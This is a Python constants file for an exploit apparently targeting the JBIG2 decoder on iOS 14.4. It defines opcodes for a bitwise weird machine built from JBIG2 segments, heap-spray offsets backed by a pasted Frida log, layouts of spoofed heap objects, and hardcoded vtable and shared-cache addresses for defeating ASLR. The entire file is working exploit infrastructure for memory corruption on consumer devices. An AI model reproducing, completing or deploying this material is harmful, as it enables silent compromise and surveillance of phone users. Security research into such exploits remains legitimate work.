"""
Constants for exploitation
"""
#############
# JBIG2 ops #
#############
# bitwise operations 
OR = 0
AND = 1
XOR = 2
XNOR = 3
REPLACE = 4

## segmentHeader flags
PAGE = 0x30
# segment list operations in readGenericRefinementSeg
COMBINE = 0x2a
STORE = 0x28
# storing immediate bytes in readGenericRegionSeg
STORE_BYTES = 0x24


###########
# segnums #
###########
overflow_sds_0xffff_segnum = 1
segments_pad_sds_segnum = 2
heap_feng_shui_sds_segnum = 3
overflow_trigger_trs_segnum = 5
arb_read_trs_segnum = 6
overflow_sds_0x27_segnum = 0xfe
placeholder_segnum = 0xc0ffee
op_segnum = 0xBADDAD


##############
# VM offsets #
##############
flags = 0x20
rax = 0x28
rbx = 0x30
rcx = 0x38
rdx = 0x40

rax_high = 0x2c
rbx_high = 0x34
rcx_high = 0x3c
rdx_high = 0x44

eax = 0x28
ebx = 0x30
ecx = 0x38
edx = 0x40

storage1 = 0x78

# bit to write when discarding, don't care about its value
garbage_bit = (0x27  << 3) + 7
sum_half_adder_bit = (flags  << 3)
carry_bit = (flags  << 3)  + 1
carry_half_adder_bit = (flags << 3) + 2


###########################
# relative search op bits #
###########################
relative_search_and_workaround_bit = (flags << 3) + 2
relative_search_xnor_bit = (flags << 3) + 3
relative_search_accumulator = (flags << 3) + 4
relative_search_previously_found = (flags << 3) + 5
relative_search_not_bit = (flags << 3) + 6
relative_search_always_1 = (flags << 3) + 7


######################
# heap spray offsets #
######################
"""
[FRIDA] [!!!] HEAP SPRAY VALID, DUMPING OFFSETS
[FRIDA] |_[0x0] pageBitmap data buffer @ 0x107c429d0
[FRIDA] |_[+0x3d0] syms malloced @ 0x107c42da0
[FRIDA] |_[+0x3f0] segments buffer @ 0x107c42dc0
[FRIDA] |_[+0x4f0] pageBitmap @ 0x107c42ec0
"""
data_buffer_to_syms = 0x3d0
data_buffer_to_segments = 0x3f0
data_buffer_to_bitmap = 0x4f0
data_buffer_to_known_good_bitmap = 0x580
data_buffer_to_bitmap_w = data_buffer_to_bitmap + 0x8 + 0x4
data_buffer_to_bitmap_h = data_buffer_to_bitmap + 0x8 + 0x8
data_buffer_to_bitmap_line = data_buffer_to_bitmap + 0x8 + 0xc
data_buffer_to_bitmap_data = data_buffer_to_bitmap + 0x8 + 0x10


##########################
# spoofed object offsets #
##########################
spoofed_bitmap = spoofed_bitmap_vtable = 0x0
spoofed_bitmap_segnum = 0x8
spoofed_bitmap_w = 0xc
spoofed_bitmap_h = 0x10
spoofed_bitmap_line = 0x14
spoofed_bitmap_data = 0x18

spoofed_sds = spoofed_sds_vtable = 0x48
spoofed_sds_segnum = spoofed_sds + 0x8
spoofed_sds_size = spoofed_sds + 0xc
spoofed_sds_bitmaps = spoofed_sds + 0x10
spoofed_sds_generic_region_stats = spoofed_sds + 0x18
spoofed_sds_refinement_region_stats = spoofed_sds + 0x20
# this isn't a used constant except for XPDF experimentation
spoofed_sds_bitmap_list = spoofed_sds + 0x28

spoofed_bitmap2 = spoofed_bitmap2_vtable = 0x60
spoofed_bitmap2_segnum = spoofed_bitmap2 + 0x8
spoofed_bitmap2_w = spoofed_bitmap2 + 0xc
spoofed_bitmap2_h = spoofed_bitmap2 + 0x10
spoofed_bitmap2_line = spoofed_bitmap2 + 0x14
spoofed_bitmap2_data = spoofed_bitmap2 + 0x18

spoofed_sds2 = spoofed_sds_vtable2 = 0x60
spoofed_sds_segnum2 = spoofed_sds2 + 0x8
spoofed_sds_size2 = spoofed_sds2 + 0xc
spoofed_sds_bitmaps2 = spoofed_sds2 + 0x10

spoofed_sds_bitmap_list2 = spoofed_sds2 + 0x28


##################
# ASLR constants #
##################
# ios 14.4 only
# offsets related to faking the objc object chain are in ios.py
# normally they'd go here, but to match some of the variable names, they need to
# start with _, which makes them private
static_jbig2_bitmap_vtable_base_addr = 0x1D1272648
static_jbig2_sds_vtable_base_addr = 0x1D1272698
bitmap_vtable_to_sds_vtable = static_jbig2_sds_vtable_base_addr - static_jbig2_bitmap_vtable_base_addr # 0x50

static_jbig2_stream_vtable_base_addr = 0x1d1272758
static_nsplaceholderdict_addr = 0x1D8EC8218
static_dyld_shared_cache_base = 0x180000000

static_jbig2_bitmap_vtable_offset = static_jbig2_bitmap_vtable_base_addr - static_dyld_shared_cache_base
static_jbig2_stream_vtable_offset = static_jbig2_stream_vtable_base_addr - static_dyld_shared_cache_base
static_nsplaceholderdict_offset = static_nsplaceholderdict_addr - static_dyld_shared_cache_base


###########################
# post page hop constants #
###########################
page_hop_spoofed_sds = page_hop_spoofed_sds_vtable = 0 
page_hop_spoofed_sds_segnum = page_hop_spoofed_sds + 8
page_hop_spoofed_sds_size = page_hop_spoofed_sds + 0xc 
page_hop_spoofed_sds_bitmaps_array = page_hop_spoofed_sds + 0x10 
page_hop_spoofed_sds_bitmaps_array_entry = page_hop_spoofed_sds + 0x18
# flags is 0x20, like before
page_hop_spoofed_bitmap = page_hop_spoofed_bitmap_vtable = page_hop_spoofed_sds + 0x28
page_hop_spoofed_bitmap_segnum = page_hop_spoofed_bitmap + 0x8
page_hop_spoofed_bitmap_w = page_hop_spoofed_bitmap + 0xc
page_hop_spoofed_bitmap_h = page_hop_spoofed_bitmap + 0x10
page_hop_spoofed_bitmap_line = page_hop_spoofed_bitmap + 0x14
page_hop_spoofed_bitmap_data = page_hop_spoofed_bitmap + 0x18

new_rax = page_hop_spoofed_bitmap + 0x20
new_rbx = new_rax + 8
new_rcx = new_rbx + 8
new_rdx = new_rcx + 8

# scratch space for atomic writes
scratch_space = new_rdx + 8
